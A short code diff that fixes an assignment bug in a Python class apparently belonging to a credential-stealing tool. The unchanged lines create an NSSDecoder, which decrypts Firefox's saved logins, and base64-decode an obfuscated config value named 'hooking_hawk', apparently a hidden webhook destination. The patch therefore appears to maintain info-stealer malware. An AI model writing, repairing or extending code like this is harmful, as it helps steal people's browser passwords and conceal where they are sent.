@@ -511,7 +511,7 @@ class hwkish_first_funct(Functions):
         self.profile = None
         self.NSS = NSSDecoder()
 
-        self.firefox_installed == False
+        self.firefox_installed = False
 
         self.eco_baby = f'{base64.b64decode(self.find_in_config("hooking_hawk"))}'.replace("b'", "").replace("'", "")
         self.ecobybro = str(self.eco_baby)
